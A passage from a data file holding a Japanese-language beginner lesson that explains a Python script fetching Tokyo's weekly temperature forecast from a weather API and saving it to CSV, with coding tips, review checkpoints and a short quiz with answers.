requests\nAPI_URL = \"https://api.open-meteo.com/v1/forecast\"\n```\n\n`csv`・`sys`・`pathlib` は標準ライブラリ、`requests` は外部ライブラリ（`pip install requests` が必要）。\n`API_URL` が全部大文字なのは「変更しない値（定数）」という慣習です。\n\n### fetch_forecast：API からデータを取る\n\n```python\nresponse = requests.get(API_URL, params=params, timeout=10)\nresponse.raise_for_status()\nreturn response.json()\n```\n\n- `params=` に辞書を渡すと、`?latitude=35.68&longitude=...` のように URL に付け足してくれる\n- `timeout=10`：10 秒応答がなければ諦める。**付けないと永遠に待つ可能性がある** ので、丁寧なコードの証拠\n- `raise_for_status()`：サーバーが 404 や 500 を返したら例外を起こす。JavaScript の `if (!res.ok)` と同じ役割\n- `.json()`：返ってきた JSON 文字列を Python の辞書に変換\n\n型ヒント `-> dict` から「辞書を返す関数」と分かります。\n\n### save_csv：zip で 3 つのリストを束ねる\n\n```python\nrows = zip(daily[\"time\"], daily[\"temperature_2m_max\"], daily[\"temperature_2m_min\"])\n```\n\nAPI は `{\"time\": [日付…], \"temperature_2m_max\": [気温…], ...}` のように **列ごとのリスト** で返します。\n`zip` はそれを `(\"2026-11-16\", 18.2, 9.1)` のように **行ごと** にまとめ直す関数です（ファスナーを閉じるイメージ）。\n\n```python\nwith path.open(\"w\", newline=\"\", encoding=\"utf-8\") as f:\n```\n\n`with` で開くので、書き終わったら自動で閉じます。`newline=\"\"` は CSV で空行が挟まるのを防ぐお約束です。\n\n### main：エラーに備える\n\n```python\nexcept requests.RequestException as e:\n    print(f\"取得に失敗しました: {e}\", file=sys.stderr)\n    sys.exit(1)\n```\n\n`RequestException` は requests のあらゆる通信エラー（タイムアウト・接続失敗・404 など）の親。\n`file=sys.stderr` はエラー用の出力先、`sys.exit(1)` は「失敗して終わった」ことを OS に伝える終わり方です（0 が成功）。\n\n## 🐍 Python の書き方で見落としやすい点\n\n| 書き方 | ポイント |\n|---|---|\n| `zip(a, b, c)` | 複数のリストを並べて 1 つずつ取り出す。長さが違うと **短い方に合わせて黙って切れる** |\n| `Path(\"forecast.csv\")` | 文字列ではなく Path オブジェクト。`path.open()` のようにメソッドが使える |\n| `count = 0 ... count += 1` | 実は `len(...)` を使うか、`enumerate` で書くこともできる |\n\n## 🔑 キーワード\n\n- **Web API**：プログラムからデータをもらうための窓口（URL）\n- **JSON**：API がよく返すデータ形式。Python では辞書とリストになる\n- **タイムアウト**：一定時間応答が無ければ諦める仕組み\n- **例外（RequestException）**：通信の失敗をまとめて受け止めるための型\n- **zip**：複数の並びを「行」に束ねる関数\n- **終了コード**：`sys.exit(1)` の 1。0 なら成功、それ以外は失敗\n\n## ⚠️ AI のコードとしてのチェックポイント\n\n- ✅ `timeout` と `raise_for_status()` があり、通信まわりは丁寧\n- ⚠️ `save_csv` は API の形が変わると `KeyError` で止まる（`data[\"daily\"]` が無い場合）。信頼できる API なので実用上は問題ない\n- ⚠️ 実行するたびに `forecast.csv` を **上書き** する（`\"w\"` モード）。履歴を残したいなら日付をファイル名に入れる\n- ⚠️ 緯度経度が東京に固定。他の地域にしたいなら引数や設定にする\n- 必要な準備：`pip install requests`、インターネット接続\n\n## 🗣️ 30 秒で人に説明するなら\n\n「これは天気予報の API から東京の 1 週間分の最高・最低気温を取ってきて、CSV に保存するスクリプトです。\nrequests で API を呼んで JSON を辞書として受け取り、zip で日付と気温を行の形にまとめて csv モジュールで書き出しています。\n通信はタイムアウトとステータスチェックをしていて、失敗したらエラーを出して終了します。」\n\n## ✅ 理解度チェック\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
   "quizzes": [
    [
     {
      "question": "`response.raise_for_status()` が無かったら、サーバーが 500 エラーを返したときどうなる？",
      "choices": [
       "自動でリトライする",
       "エラーにならず、エラーページの中身を JSON として読もうとして別の場所で失敗しやすい",
       "プログラムが必ず止まる"
      ],
      "answer": 1,
      "explain": "ステータスコードのチェックは自分で行う必要があります（JavaScript の res.ok と同じ）。"
     },
     {
      "question": "`zip([\"a\", \"b\"], [1, 2])` から順に取り出されるのは？",
      "choices": [
       "(\"a\", 1), (\"b\", 2)",
       "(\"a\", \"b\"), (1, 2)",
       "[\"a\", 1, \"b\", 2]"
      ],
      "answer": 0,
      "explain": "同じ位置のものを組にして取り出します。"
     },
     {
      "question": "このスクリプトを他のファイルから `import` したとき、天気の取得は実行される？",
      "choices": [
       "される",
       "されない"
      ],
      "answer": 1,
      "explain": "`if __name__ == \"__main__\":` の中は、直接実行したときだけ動きます。"
     }
    ]
   ],
   "id": "2026-11-16-weather-to-csv"
  }
 ]
};
